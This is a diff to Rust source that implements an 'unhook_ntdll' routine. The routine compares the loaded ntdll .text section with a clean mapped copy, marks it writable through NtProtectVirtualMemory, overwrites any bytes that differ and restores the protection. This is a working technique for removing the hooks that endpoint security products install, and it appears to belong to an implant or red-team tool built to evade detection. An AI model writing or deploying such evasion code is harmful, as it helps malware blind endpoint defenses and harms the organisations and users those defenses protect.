@@ -198,6 +198,64 @@ pub unsafe fn unhook_ntdll() -> Option<usize> {
     let compare_size = text_size.min(clean_size);
     debug!("[UNHOOK] .text loaded=0x{:X} size=0x{:X}", loaded_text, compare_size);
 
-    // TODO: Compare and count differences
-    unimplemented!()
+    // Compare and count differences
+    let loaded_bytes = core::slice::from_raw_parts(loaded_text as *const u8, compare_size);
+    let clean_bytes = core::slice::from_raw_parts(clean_text as *const u8, compare_size);
+
+    let mut diff_count: usize = 0;
+    for i in 0..compare_size {
+        if loaded_bytes[i] != clean_bytes[i] {
+            diff_count += 1;
+        }
+    }
+
+    if diff_count == 0 {
+        debug!("[UNHOOK] No hooks detected - ntdll is clean");
+        nt::nt_unmap_view_of_section(current_process, clean_base);
+        return Some(0);
+    }
+    debug!("[UNHOOK] Detected {} hooked bytes - restoring", diff_count);
+
+    // Change loaded .text to RW
+    let mut protect_base = loaded_text as *mut c_void;
+    let mut protect_size = compare_size;
+    let mut old_protect: u32 = 0;
+
+    let status = nt::nt_protect_virtual_memory(
+        current_process,
+        &mut protect_base,
+        &mut protect_size,
+        0x04, // PAGE_READWRITE
+        &mut old_protect,
+    );
+    if status != STATUS_SUCCESS {
+        debug!("[UNHOOK] NtProtectVirtualMemory(RW) failed: 0x{:08X}", status);
+        nt::nt_unmap_view_of_section(current_process, clean_base);
+        return None;
+    }
+
+    // Overwrite hooked bytes with clean bytes
+    core::ptr::copy_nonoverlapping(
+        clean_bytes.as_ptr(), 
+        loaded_text as *mut u8, 
+        compare_size
+    );
+
+    // Restore original protection
+    let mut protect_base2 = loaded_text as *mut c_void;
+    let mut protect_size2 = compare_size;
+    let mut dummy: u32 = 0;
+    nt::nt_protect_virtual_memory(
+        current_process,
+        &mut protect_base2,
+        &mut protect_size2,
+        old_protect,
+        &mut dummy,
+    ); 
+
+    // Cleanup
+    nt::nt_unmap_view_of_section(current_process, clean_base);
+
+    debug!("[UNHOOK] ntdll .text restored - {} bytes fixed", diff_count);
+    Some(diff_count)
 }
